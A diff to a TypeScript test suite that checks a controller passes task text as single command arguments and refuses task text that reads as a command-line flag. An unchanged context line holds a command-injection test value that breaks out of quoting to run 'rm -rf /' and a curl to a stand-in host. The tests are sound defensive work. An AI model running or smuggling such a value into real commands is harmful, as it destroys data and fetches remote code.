@@ -146,4 +146,22 @@ describe('controller', () => {
 
     expect(world.runs[0]?.argv).toEqual([...PREFIX, 'hooks', 'route', '--task', 'x"; rm -rf / # $(curl evil)', '--format', 'json'])
   })
+
+  test('a task text that would read as a flag is not passed at all', async ($, on) => {
+    const flagged = JSON.parse(RUFLO_RUN['.claude-flow/tasks/store.json'] ?? '{}') as { tasks: Record<string, { description: string }> }
+    const login = flagged.tasks[LOGIN_TASK]
+
+    if (login !== undefined) {
+      login.description = '--format=yaml --task x'
+    }
+
+    const world = worldOf(on, { ...RUFLO_RUN, '.claude-flow/tasks/store.json': JSON.stringify(flagged) })
+
+    mock.clock(on)
+    await $.session.start(SESSION)
+    await press($, 'reroute')
+
+    expect(world.runs).toEqual([])
+    expect(textOf(await $.ui.render(PANE))).toContain('✗ failed: re-route · nothing to act on')
+  })
 })
